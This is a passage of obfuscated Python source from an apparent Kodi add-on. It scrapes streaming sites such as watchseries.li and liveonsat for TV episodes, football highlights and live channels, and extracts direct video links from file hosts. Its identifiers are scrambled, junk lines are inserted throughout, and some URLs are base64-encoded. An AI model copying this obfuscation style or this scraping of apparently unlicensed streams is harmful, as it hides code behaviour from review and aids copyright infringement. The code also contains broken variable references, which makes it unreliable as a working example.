 if 71 - 71: i1IIi - OOoo0OO0 * I1I1ii + Ooo0OO0oOO - Ooo00oOo00o % ii11ii1ii
 if 63 - 63: iIii1I11I1II1 + i11i1 . Ooo00oOo00o / OOOo0
 if 84 - 84: i1IIi
 if 42 - 42: OoOoOO00 - Ooo00oOo00o - OoooooooOO . II1i1IiiIIi11 / I1IiI
 if 56 - 56: i11iIiiIii - iIii1I11I1II1 . OoOoOO00
 if 81 - 81: iI1Ii11iII1 / I1IiI * iI1Ii11iII1 . O0
 if 61 - 61: Ooo00oOo00o * i11i1 + I1I1ii . iIii1I11I1II1 % OOoo0OO0 . I1I1ii
 if 53 - 53: I1I1ii * iI1Ii11iII1 / iIii1I11I1II1 / OOOo0 % ii11ii1ii
 if 39 - 39: Ooo00oOo00o / OoooooooOO . Ooo00oOo00o * ii11ii1ii / I1IiI
 if 38 - 38: Ooo00oOo00o / oOO % I1I1ii * OOoo0OO0 + i11iIiiIii % oOO
 if 61 - 61: I1I1ii - oO0O % ii11ii1ii / oOO / II1i1IiiIIi11 + iIii1I11I1II1
 if 87 - 87: I1I1ii + oOO + O0 / i1IIi % iI1Ii11iII1 / I1I1ii
 if 64 - 64: Ooo00oOo00o % iI1Ii11iII1 . I1I1ii % Ooo00oOo00o + OOoo0OO0 * iI1Ii11iII1
 iIiIIIi ( '[COLORgreen]Newest Episodes Added[/COLOR]' , 'http://www.watchseries.li/latest' , 10046 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 iIiIIIi ( '[COLORgreen]This Week\'s Popular Episodes[/COLOR]' , 'http://www.watchseries.li/new' , 10042 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 iIiIIIi ( '[COLORgreen]Search Program[/COLOR]' , '' , 10043 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 if 83 - 83: OOooOOo % Ooo0OO0oOO + OOoo0OO0 % i11iIiiIii + O0
 if 65 - 65: iIii1I11I1II1 % Ooo0OO0oOO + O0 / OoooooooOO
def O0000oO0o00 ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 O0oO = re . compile ( '<ul class="pagination" style="line-height: 3;">(.+?)</ul>' , re . DOTALL ) . findall ( Oo0oO00o )
 IiI11iII1 = re . compile ( '<li><a href="/letters/(.+?)">(.+?)</a></li>' ) . findall ( str ( O0oO ) )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , 'http://watchseries.li/letters/' + url , 10049 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
  if 80 - 80: OoooooooOO + iI1Ii11iII1
def O00O ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<a href="(.+?)" class="sr-header">(.+?)</a>' ) . findall ( Oo0oO00o )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , 'http://watchseries.li/' + url , 10049 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
  if 63 - 63: OoooooooOO * OoooooooOO % Ooo00oOo00o + O0 / I1I1ii + iIii1I11I1II1
def oO0o0o00oOo0O ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<li class="col-md-6 col-xs-12 list-movies-li"><a href="(.+?)" title=".+?">(.+?)<span class="epnum">.+?</span></a></li>' , re . DOTALL ) . findall ( Oo0oO00o )
 IIII11I1I = re . compile ( '&hellip;<li><a href=".+?">.+?</a></li><li><a href=".+?">.+?</a></li><li><a href="(.+?)">Next</a></li></ul>' , re . DOTALL ) . findall ( Oo0oO00o )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  iIiIIIi ( '[COLORgreen]' + ( oO00oooOOoOo0 ) . replace ( '&nbsp;' , ' ' ) . replace ( '&' , '&' ) . replace ( '&#039;' , '\'' ) + '[/COLOR]' , 'http://www.watchseries.li' + url , 10044 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 for url in IIII11I1I :
  iIiIIIi ( '[COLORgreen]' + 'NEXT' + '[/COLOR]' , 'http://www.watchseries.li' + url , 10049 , ii11iIi1I + 'Next.png' , '' , '' )
  if 100 - 100: Ooo00oOo00o % Ooo00oOo00o
  if 15 - 15: Ooo0OO0oOO / I1I1ii
def Iiii111 ( ) :
 iiI11iI = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 Ooooo = 'http://www.watchseries.li/search/' + iiI11iI . replace ( ' ' , '%20' )
 Oo0oO00o = I1ii1Ii1 ( Ooooo )
 IiI11iII1 = re . compile ( '<img src="(.+?)".+?<a href="(.+?)" title=".+?"><b>(.+?)</b>' , re . DOTALL ) . findall ( Oo0oO00o )
 for IIIIiI11I11 , ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  if 'watch online' in oO00oooOOoOo0 :
   pass
  else :
   print ooooO0oOoOOoO
   iIiIIIi ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , 'http://www.watchseries.li' + ooooO0oOoOOoO , 10044 , IIIIiI11I11 , '' , '' )
   if 91 - 91: oOO * OOoo0OO0 - OoOoOO00 . OOOo0 - Oo + oOO
   xbmcplugin . setContent ( I11i1 , 'movies' )
   if 56 - 56: OOooOOo / iI1Ii11iII1 * OOOo0 . OOooOOo
def iiO0o0O0oo0o ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<img src="(.+?)".+?<div class="block-left-home-inside-text">.+?<a href="(.+?)" title=".+?"><b>(.+?)</b> <br>.+?<span class=".+?">(.+?)</span></a><br>(.+?)<br>' , re . DOTALL ) . findall ( Oo0oO00o )
 for IIIIiI11I11 , url , oO00oooOOoOo0 , OOOOOo , o0OoOO in IiI11iII1 :
  O0Oooo = ( oO00oooOOoOo0 ) . replace ( '&nbsp;' , ' ' ) . replace ( '&' , '&' ) . replace ( '&#039;' , '\'' ) + ' - ' + ( OOOOOo ) . replace ( '&' , '&' ) . replace ( '&#039;' , '\'' )
  iIiIIIi ( '[COLORgreen]' + O0Oooo + '[/COLOR]' , 'http://www.watchseries.li' + url , 10045 , IIIIiI11I11 , '' , o0OoOO )
  if 27 - 27: oOO + i11iIiiIii * OOoo0OO0 + I1IiI + II1i1IiiIIi11
def o0o ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<li class="col-md-6 col-xs-12 list-movies-li"><a href="(.+?)" title=".+?">(.+?)<span class="epnum">.+?</span></a></li>' , re . DOTALL ) . findall ( Oo0oO00o )
 IIII11I1I = re . compile ( '&hellip;<li><a href=".+?">.+?</a></li><li><a href=".+?">.+?</a></li><li><a href="(.+?)">Next</a></li></ul>' , re . DOTALL ) . findall ( Oo0oO00o )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  O0Oooo = ( oO00oooOOoOo0 ) . replace ( '&nbsp;' , ' ' ) . replace ( '&' , '&' ) . replace ( '&#039;' , '\'' )
  iIiIIIi ( '[COLORgreen]' + O0Oooo + '[/COLOR]' , 'http://www.watchseries.li' + url , 10045 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 for url in IIII11I1I :
  iIiIIIi ( '[COLORgreen]' + 'NEXT' + '[/COLOR]' , 'http://www.watchseries.li' + url , 10046 , ii11iIi1I + 'Next.png' , '' , '' )
  if 17 - 17: iI1Ii11iII1 / ii11ii1ii - OOooOOo * ii11ii1ii
def i11i11II11i ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<div class="mask">.+?<a href="(.+?)" title="(.+?)">.+?<img src="(.+?)"' , re . DOTALL ) . findall ( Oo0oO00o )
 IIII11I1I = re . compile ( '&hellip;<li><a href=".+?">.+?</a></li><li><a href=".+?">.+?</a></li><li><a href="(.+?)">Next</a></li></ul>' , re . DOTALL ) . findall ( Oo0oO00o )
 for url , oO00oooOOoOo0 , IIIIiI11I11 in IiI11iII1 :
  iIiIIIi ( '[COLORgreen]' + ( oO00oooOOoOo0 ) . replace ( '&nbsp;' , ' ' ) . replace ( '&' , '&' ) . replace ( '&#039;' , '\'' ) + '[/COLOR]' , 'http://www.watchseries.li' + url , 10044 , IIIIiI11I11 , '' , '' )
 for url in IIII11I1I :
  iIiIIIi ( '[COLORgreen]' + 'NEXT' + '[/COLOR]' , 'http://www.watchseries.li' + url , 10041 , ii11iIi1I + 'Next.png' , '' , '' )
  if 9 - 9: I1IiI - ii11ii1ii * oOO . oOO - OOOo0
def OOooOooo0OOo0 ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 O0oO = re . compile ( '<div class="col-md-6 col-xs-12".+?<a href=".+?" itemprop="url"><span itemprop="name">(.+?)</span>(.+?)</ul>' , re . DOTALL ) . findall ( Oo0oO00o )
 for iIi11io0o00o0Oo , II1Ii in O0oO :
  IiI11iII1 = re . compile ( '<li itemprop="episode".+?<meta itemprop="url" content="(.+?)">.+?<span class="" itemprop="name">\n(.+?)\n' , re . DOTALL ) . findall ( str ( II1Ii ) )
  for url , oO00oooOOoOo0 in IiI11iII1 :
   O0Oooo = ( iIi11io0o00o0Oo ) . replace ( '  ' , '' ) + ' ' + ( oO00oooOOoOo0 ) . replace ( '&nbsp;' , ' ' ) . replace ( '&#039;' , '\'' ) . replace ( '  ' , '' )
   iIiIIIi ( '[COLORgreen]' + O0Oooo + '[/COLOR]' , 'http://www.watchseries.li' + url , 10045 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 IIII11I1I = re . compile ( '&hellip;<li><a href=".+?">.+?</a></li><li><a href=".+?">.+?</a></li><li><a href="(.+?)">Next</a></li></ul>' , re . DOTALL ) . findall ( Oo0oO00o )
 for url in IIII11I1I :
  iIiIIIi ( '[COLORgreen]' + 'NEXT' + '[/COLOR]' , 'http://www.watchseries.li' + url , 10044 , ii11iIi1I + 'Next.png' , '' , '' )
  if 87 - 87: iI1Ii11iII1
  if 17 - 17: oO0O / iIii1I11I1II1 - Ooo00oOo00o + OOOo0 % i11i1
class III1III11II ( ) :
 if 43 - 43: OOOo0
 List = [ ]
 source_list = [ ]
 def __init__ ( self , name ) :
  if 47 - 47: OoooooooOO % I1IiI
  O0Oooo = name
  self . Get_Sources ( ooooO0oOoOOoO , O0Oooo )
  if 63 - 63: Ooo00oOo00o / I1IiI * iIii1I11I1II1 . I1I1ii
  if 85 - 85: i11iIiiIii / i11iIiiIii . Ooo00oOo00o . O0
 def Get_Sources ( self , URL , season_name ) :
  Oo0oO0ooo = xbmcgui . DialogProgress ( )
  Oo0oO00o = I1ii1Ii1 ( URL )
  IiI11iII1 = re . compile ( '<td>.+?<a href="/link/(.+?)".+?height="16px">(.+?)\n' , re . DOTALL ) . findall ( Oo0oO00o )
  for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
   URL = 'http://www.watchseries.li/link/' + ooooO0oOoOOoO
   self . Get_site_link ( URL , season_name )
   if 67 - 67: OoOoOO00 / OOooOOo . i11i1 . OoooooooOO
 def Get_site_link ( self , url , season_name ) :
  Oo0oO00o = I1ii1Ii1 ( url )
  IiI11iII1 = re . compile ( '<iframe style=.+?" src="(.+?)"' ) . findall ( Oo0oO00o )
  IIII11I1I = re . compile ( '<IFRAME SRC="(.+?)"' ) . findall ( Oo0oO00o )
  I1i1ii1IiIii = re . compile ( '<IFRAME style=".+?" SRC="(.+?)"' ) . findall ( Oo0oO00o )
  for url in IiI11iII1 :
   self . main ( url , season_name )
  for url in IIII11I1I :
   self . main ( url , season_name )
  for url in I1i1ii1IiIii :
   self . main ( url , season_name )
   if 19 - 19: iI1Ii11iII1 . ii11ii1ii / I1IiI
 def main ( self , url , season_name ) :
  Oo0oO0ooo . create ( "[COLORwhite]Origin[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
  if 'daclips.in' in url :
   O00oo = 'DACLIPS'
   if O00oo in III1III11II . source_list :
    pass
   else :
    self . daclips ( url , season_name , O00oo )
    Oo0oO0ooo . update ( 0 , "" , "Getting Daclips Links" )
  else :
   if 'filehoot.com' in url :
    O00oo = 'FILEHOOT'
    if O00oo in III1III11II . source_list :
     pass
    else :
     Oo0oO0ooo . update ( 0 , "" , "Getting Filehoot Links" )
     self . filehoot ( url , season_name , O00oo )
   else :
    if 'thevideo.me' in url :
     O00oo = 'THEVIDEO'
     if O00oo in III1III11II . source_list :
      pass
     else :
      self . thevideo ( url , season_name , O00oo )
      Oo0oO0ooo . update ( 0 , "" , "Getting Thevideo Links" )
    else :
     if 'allmyvideos.net' in url :
      O00oo = 'ALLMYVIDEOS'
      if O00oo in III1III11II . source_list :
       pass
      else :
       self . allmyvid ( url , season_name , O00oo )
       Oo0oO0ooo . update ( 0 , "" , "Getting Allmyvideo Links" )
     else :
      if 'vidspot.net' in url :
       O00oo = 'VIDSPOT'
       if O00oo in III1III11II . source_list :
        pass
       else :
        self . vidspot ( url , season_name , O00oo )
        Oo0oO0ooo . update ( 0 , "" , "Getting Vidspot Links" )
      else :
       if 'vodlocker' in url :
        O00oo = 'VODLOCKER'
        if O00oo in III1III11II . source_list :
         pass
        else :
         self . vodlocker ( url , season_name , O00oo )
         Oo0oO0ooo . update ( 0 , "" , "Getting Vodlocker Links" )
         if 75 - 75: iIii1I11I1II1 * i11iIiiIii - OoooooooOO . I1IiI
         if 70 - 70: Ooo0OO0oOO * Ooo0OO0oOO + Oo * i11i1 % OOOo0 + iIii1I11I1II1
 def allmyvid ( self , url , season_name , source_name ) :
  Oo0oO00o = I1ii1Ii1 ( url )
  IiI11iII1 = re . compile ( '"file" : "(.+?)",\n.+?"default" : .+?,\n.+?"label" : "(.+?)"' , re . DOTALL ) . findall ( Oo0oO00o )
  for i1oOOO0ooOO , oO00oooOOoOo0 in IiI11iII1 :
   self . Printer ( i1oOOO0ooOO , season_name , source_name )
   if 3 - 3: OoooooooOO
 def vidspot ( self , url , season_name , source_name ) :
  Oo0oO00o = I1ii1Ii1 ( url )
  IiI11iII1 = re . compile ( '"file" : "(.+?)",\n.+?"default" : .+?,\n.+?"label" : "(.+?)"' ) . findall ( Oo0oO00o )
  for i1oOOO0ooOO , oO00oooOOoOo0 in IiI11iII1 :
   self . Printer ( i1oOOO0ooOO , season_name , source_name )
   if 71 - 71: iI1Ii11iII1 + i1IIi - II1i1IiiIIi11 - i11iIiiIii . OOoo0OO0 - oOO
 def thevideo ( self , url , season_name , source_name ) :
  Oo0oO00o = I1ii1Ii1 ( url )
  IiI11iII1 = re . compile ( "{ label: '.+?', file: '(.+?)' }" ) . findall ( Oo0oO00o )
  for i1oOOO0ooOO in IiI11iII1 :
   self . Printer ( i1oOOO0ooOO , season_name , source_name )
   if 85 - 85: ii11ii1ii - I1IiI / ii11ii1ii + i11i1 - II1i1IiiIIi11
 def vodlocker ( self , url , season_name , source_name ) :
  Oo0oO00o = I1ii1Ii1 ( url )
  IiI11iII1 = re . compile ( 'file: "(.+?)",.+?skin' , re . DOTALL ) . findall ( Oo0oO00o )
  for i1oOOO0ooOO in IiI11iII1 :
   self . Printer ( i1oOOO0ooOO , season_name , source_name )
   if 49 - 49: Ooo00oOo00o - O0 / Ooo00oOo00o * I1IiI + I1I1ii
 def daclips ( self , url , season_name , source_name ) :
  Oo0oO00o = I1ii1Ii1 ( url )
  IiI11iII1 = re . compile ( '{ file: "(.+?)", type:"video" }' ) . findall ( Oo0oO00o )
  for i1oOOO0ooOO in IiI11iII1 :
   self . Printer ( i1oOOO0ooOO , season_name , source_name )
   if 35 - 35: OoOoOO00 . OOOo0 / i1IIi / OOOo0 * Ooo0OO0oOO
 def filehoot ( self , url , season_name , source_name ) :
  Oo0oO00o = I1ii1Ii1 ( url )
  IiI11iII1 = re . compile ( 'file: "(.+?)",.+?skin' , re . DOTALL ) . findall ( Oo0oO00o )
  for i1oOOO0ooOO in IiI11iII1 :
   self . Printer ( i1oOOO0ooOO , season_name , source_name )
   if 85 - 85: OoOoOO00 . oOO % i11i1 % OOoo0OO0
 def Printer ( self , Link , season_name , source_name ) :
  if 80 - 80: Ooo0OO0oOO * OOoo0OO0 / iIii1I11I1II1 % Ooo0OO0oOO / iIii1I11I1II1
  if Link in III1III11II . List :
   pass
  elif source_name in III1III11II . source_list :
   pass
  else :
   I1i1iii1Ii ( '[COLORgreen]' + source_name + '[/COLOR]' , Link , 10012 , ii11iIi1I + 'WATCHSERIES.png' )
   Oo0oO0ooo . update ( 100 , "" , "Got Source" )
   III1III11II . List . append ( Link )
   III1III11II . source_list . append ( source_name )
   if 42 - 42: i1IIi / i11iIiiIii . Oo * II1i1IiiIIi11 . i11iIiiIii * O0
   xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
   if 44 - 44: i1IIi . OOOo0 / i11iIiiIii + iI1Ii11iII1
   if 27 - 27: i11i1
   if 52 - 52: I1I1ii % I1IiI + iIii1I11I1II1 * Ooo0OO0oOO . oO0O
   if 95 - 95: iIii1I11I1II1 . iI1Ii11iII1 - OoooooooOO * Ooo00oOo00o / OOooOOo
   if 74 - 74: Ooo0OO0oOO
def iII1i1IIiI1I ( ) :
 iIiIIIi ( '[COLORgreen]Highlights[/COLOR]' , '' , 10008 , ii11iIi1I + 'ORIGINFOOTBALL.png' , i1iiIII111ii , '' )
 iIiIIIi ( '[COLORgreen]Fixtures[/COLOR]' , '' , 10009 , ii11iIi1I + 'ORIGINFOOTBALL.png' , i1iiIII111ii , '' )
 if 67 - 67: oO0O
def iIII11Iiii1 ( ) :
 IIi1IIIi = I1ii1Ii1 ( i1111 ( 'aHR0cDovL2xpdmVvbnNhdC5jb20vcXVpY2tpbmRleC5odG1s' ) )
 IiI11iII1 = re . compile ( '<a target="_self" href="(.+?)".+?src="(.+?)" alt="(.+?)"' , re . DOTALL ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  iIiIIIi ( '[COLORgreen]' + ( oO00oooOOoOo0 ) . replace ( 'amp;' , '' ) + '[/COLOR]' , i1111 ( 'aHR0cDovL2xpdmVvbnNhdC5jb20v' ) + ooooO0oOoOOoO , 10010 , i1111 ( 'aHR0cDovL2xpdmVvbnNhdC5jb20v' ) + IIIIiI11I11 , i1iiIII111ii , '' )
  if 95 - 95: OOOo0
def o0OoO0OOoO0Oo0 ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 O0oO = re . compile ( 'AndClearL.+?><h2.+?head>(.*?)float' , re . DOTALL ) . findall ( Oo0oO00o )
 for O0oO in O0oO :
  oO00O = re . compile ( '(.*?)</h2>' ) . findall ( str ( O0oO ) )
  for II111IiiiI1 in oO00O :
   II111IiiiI1 = II111IiiiI1
  oooOO0oo0Oo00 = re . compile ( 'comp_head>(.*?)</span>.*?<div class = fLeft width = ".*?"><img src="(.*?)">.*?</div>.*?ST:(.*?)</div>(.+?)<!-- around all of channel types ENDS 2-->' , re . DOTALL ) . findall ( str ( O0oO ) )
  for oOoO , IIIIiI11I11 , time , iI111I1III in oooOO0oo0Oo00 :
   IiIi = re . compile ( ",CAPTION, '(.+?)&nbsp" ) . findall ( iI111I1III )
   iIiIIIi ( '[COLORgreen]' + II111IiiiI1 + ' - ' + oOoO + ' - ' + time + '[/COLOR]' , '' , 10010 , i1111 ( 'aHR0cDovL2xpdmVvbnNhdC5jb20=' ) + IIIIiI11I11 , i1iiIII111ii , ( str ( IiIi ) ) )
   if 36 - 36: OOoo0OO0 % i11i1
 i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
 if 72 - 72: OOOo0 / II1i1IiiIIi11 - O0 + OOoo0OO0
def o0iIIIIi ( ) :
 if 50 - 50: I1I1ii + oOO + II1i1IiiIIi11
 iIiIIIi ( '[COLORgreen]Shows[/COLOR]' , 'http://www.fullmatchesandshows.com/category/show/' , 10011 , 'http://www.fm-base.co.uk/forum/attachments/club-competition-logos/3885-soccer-am-logo-socceram.png' , ii11iIi1I + 'fanart.jpg' , '' )
 iIiIIIi ( '[COLORgreen]Premier League[/COLOR]' , 'http://www.fullmatchesandshows.com/premier-league/' , 10011 , 'https://footballseasons.files.wordpress.com/2013/05/premier-league.png' , ii11iIi1I + 'fanart.jpg' , '' )
 iIiIIIi ( '[COLORgreen]La Liga[/COLOR]' , 'http://www.fullmatchesandshows.com/la-liga/' , 10011 , 'http://1.bp.blogspot.com/-c6kQ40ryhyo/U19cUlz25sI/AAAAAAAABak/qtn5chSFZm0/s1600/la-liga-logo_display_image.png' , ii11iIi1I + 'fanart.jpg' , '' )
 iIiIIIi ( '[COLORgreen]Bundesliga[/COLOR]' , 'http://www.fullmatchesandshows.com/bundesliga/' , 10011 , 'http://m.img.brothersoft.com/iphone/189/518670189_icon175x175.jpg' , ii11iIi1I + 'fanart.jpg' , '' )
 iIiIIIi ( '[COLORgreen]Champions League[/COLOR]' , 'http://www.fullmatchesandshows.com/champions-league/' , 10011 , 'http://www.ecursuri.ro/images/teste/test-champions-league.jpg' , ii11iIi1I + 'fanart.jpg' , '' )
 iIiIIIi ( '[COLORgreen]Serie A[/COLOR]' , 'http://www.fullmatchesandshows.com/category/serie-a/' , 10011 , 'http://files.jcriccione.it/200000223-2484526782/serie%20a.png' , ii11iIi1I + 'fanart.jpg' , '' )
 iIiIIIi ( '[COLORgreen]Ligue 1[/COLOR]' , 'http://www.fullmatchesandshows.com/category/ligue-1/' , 10011 , 'http://a1.mzstatic.com/us/r30/Purple5/v4/37/c7/44/37c744ae-5824-42b7-6ce0-5f471f52baab/icon180x180.jpeg' , ii11iIi1I + 'fanart.jpg' , '' )
 iIiIIIi ( '[COLORgreen]Copa America 2015[/COLOR]' , 'http://www.fullmatchesandshows.com/copa-america-2015/' , 10011 , 'https://pbs.twimg.com/profile_images/521966985907691520/Nq9OAPIo_400x400.png' , ii11iIi1I + 'fanart.jpg' , '' )
 iIiIIIi ( '[COLORgreen]CONCACAF[/COLOR]' , 'http://www.fullmatchesandshows.com/category/concacaf/' , 10011 , 'http://a3.mzstatic.com/us/r30/Purple3/v4/40/26/14/4026147c-7022-4ca3-504e-e78950cc3f1c/icon175x175.png' , ii11iIi1I + 'fanart.jpg' , '' )
 iIiIIIi ( '[COLORgreen]Women World Cup[/COLOR]' , 'http://www.fullmatchesandshows.com/category/women-world-cup/' , 10011 , 'https://upload.wikimedia.org/wikipedia/en/thumb/7/76/2015_FIFA_Women\'s_World_Cup_logo.svg/967px-2015_FIFA_Women\'s_World_Cup_logo.svg.png' , ii11iIi1I + 'fanart.jpg' , '' )
 if 15 - 15: OOoo0OO0
def IiiI11I1IIiI ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( 'itemprop="image" class="entry-thumb" src="(.+?)".+?<h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="(.+?)" rel="bookmark" title=".+?">(.+?)</a></h3>' , re . DOTALL ) . findall ( Oo0oO00o )
 for IIIIiI11I11 , url , oO00oooOOoOo0 in IiI11iII1 :
  i1iI1i = oO00oooOOoOo0 . replace ( '&#8211;' , '-' ) . replace ( '&#038;' , '&' )
  I1i1iii1Ii ( '[COLORgreen]' + i1iI1i + '[/COLOR]' , url , 10013 , IIIIiI11I11 )
  if 59 - 59: iI1Ii11iII1
def oOoO0OOO00O ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<script data-config="(.+?)" data-height' ) . findall ( Oo0oO00o )
 for OOoOooOoOOOoo in IiI11iII1 :
  OOOOO0o0OOo = ( OOoOooOoOOOoo ) . replace ( '/v2' , '' ) . replace ( 'zeus.json' , 'video-sd.mp4?hosting_id=21772' ) . replace ( 'config.playwire.com' , 'cdn.video.playwire.com' )
  o00OOo ( 'http:' + OOOOO0o0OOo )
  if 40 - 40: iI1Ii11iII1 * Ooo0OO0oOO % OOoo0OO0 * ii11ii1ii
  if 80 - 80: iIii1I11I1II1 - OoooooooOO - ii11ii1ii - ii11ii1ii . OoooooooOO
def I1iI11I ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<a href="([^"]*)" title="([^"]*)"><img itemprop="image" content="([^"]*)"' , re . DOTALL ) . findall ( IIi1IIIi )
 IIII11I1I = re . compile ( "<a rel='next' href=([^=]*)=" , re . DOTALL ) . findall ( IIi1IIIi )
 for url , oO00oooOOoOo0 , IIIIiI11I11 in IiI11iII1 :
  I1i1iii1Ii ( oO00oooOOoOo0 , url , 8046 , IIIIiI11I11 )
 for url in IIII11I1I :
  oo0o0000Oo0 ( 'NEXT PAGE' , ( url ) . replace ( ' class' , '' ) , 8045 , ii11iIi1I + 'Next.png' )
def Oo0oOO ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( "__filename='([^']*)',.+?__fullimage='([^']*)',.+?__title='([^']*)'," , re . DOTALL ) . findall ( IIi1IIIi )
 for url , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  o00OOo ( 'http://bitcast-b.bitgravity.com/ndtvod/23372/ndtv/' + url )
  if 86 - 86: iIii1I11I1II1 / O0
def iiiIi ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( "src='http://www.youtube.com/embed/(.+?)?version=3&#038;rel=1&#038;fs=1&#038;autohide=2&#038;showsearch=0&#038;showinfo=1&#038;iv_load_policy=1&#038;wmode=transparent' frameborder='0' allowfullscreen='true'></iframe>" ) . findall ( IIi1IIIi )
 for url in IiI11iII1 :
  yt . PlayVideo ( url )
  if 62 - 62: O0 . Oo
def iI1ii ( ) :
 IIi1IIIi = O00Ooo ( i1111 ( 'aHR0cDovL3RvcGRvY3VtZW50YXJ5ZmlsbXMuY29tLw==' ) )
 IiI11iII1 = re . compile ( '<a href="(.+?)" >(.+?)</a></li><li>' ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 , ooooO0oOoOOoO , 8041 , ii11iIi1I + 'documentary.png' )
def O0OooOO ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<h2><a href="(.+?)" title="(.+?)">.+?</a></h2>.+?src="(.+?)"' , re . DOTALL ) . findall ( IIi1IIIi )
 IIII11I1I = re . compile ( 'class="inactive">.+?</a><a href="(.+?)">Next</a></div>' , re . DOTALL ) . findall ( IIi1IIIi )
 for url , oO00oooOOoOo0 , IIIIiI11I11 in IiI11iII1 :
  oo0o0000Oo0 ( ( oO00oooOOoOo0 ) . replace ( '&#039;s' , '' ) , url , 8042 , IIIIiI11I11 )
 for url in IIII11I1I :
  oo0o0000Oo0 ( 'NEXT PAGE' , url , 8041 , ii11iIi1I + 'Next.png' )
  if 49 - 49: iI1Ii11iII1 / oOO / i11i1
  if 25 - 25: OOOo0 % O0 + i1IIi - oOO
def III1IiI1i1i ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<meta itemprop="name" content="(.+?)".+?<meta itemprop="thumbnailUrl" content="(.+?)".+?<meta itemprop="embedUrl" content="(.+?)".+?<meta itemprop="description" content="(.+?)" />' , re . DOTALL ) . findall ( IIi1IIIi )
 IIII11I1I = re . compile ( '<div class="video new-video"><iframe width="766" height="431" src="(.+?)&iv_load_policy=3&showinfo=0&autohide=1"' , re . DOTALL ) . findall ( IIi1IIIi )
 for oO00oooOOoOo0 , IIIIiI11I11 , url , Ii1I in IiI11iII1 :
  I1i1iii1Ii ( ( oO00oooOOoOo0 ) . replace ( '&#039;s' , '' ) , url . replace ( 'https://www.youtube.com/embed/' , '' ) , 8043 , IIIIiI11I11 )
 for url in IIII11I1I :
  o0OOOOOo0 ( ( url ) . replace ( '//' , 'http://' ) )
  if 57 - 57: iIii1I11I1II1 + iIii1I11I1II1
def o0OOOOOo0 ( url ) :
 IIi1IIIi = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<link rel="canonical" href="(.+?)">  <link rel="stylesheet"' ) . findall ( IIi1IIIi )
 for url in IiI11iII1 :
  I1i1iii1Ii ( 'PLAY' , ( url ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , ii11iIi1I + 'documentary.png' )
  if 56 - 56: Ooo0OO0oOO + oOO
def Ii1Ii1 ( ) :
 Oo0oO00o = O00Ooo ( 'http://www.stream2watch.co/live-tv' )
 IiI11iII1 = re . compile ( '<a href="(.+?)">.+?<img src="(.+?)" alt=".+?"/>.+?<span class="country_name">(.+?)<br />(.+?)</span>' , re . DOTALL ) . findall ( Oo0oO00o )
 for ooooO0oOoOOoO , IIIIiI11I11 , oO00oooOOoOo0 , ii1IiI11I in IiI11iII1 :
  oo0o0000Oo0 ( ( oO00oooOOoOo0 + '[COLORgreen]' + ii1IiI11I + '[/COLOR]' ) , ooooO0oOoOOoO , 8086 , IIIIiI11I11 )
  if 90 - 90: OOooOOo % Ooo0OO0oOO % i11iIiiIii . i11i1 % i11i1
def IIi11iI1Iii ( url ) :
 Oo0oO00o = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<a class="front_channel_href" href="(.+?)" title=".+?">.+?<img class="front_channel_thumb" src="(.+?)" alt=".+?"/>.+?<span class="front_channel_name">(.+?)</span>' , re . DOTALL ) . findall ( Oo0oO00o )
 for url , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , url , 8087 , IIIIiI11I11 )
  if 29 - 29: O0 + OOOo0 - i1IIi % Oo + I1I1ii / OOoo0OO0
def iI1IIIII1Ii ( url ) :
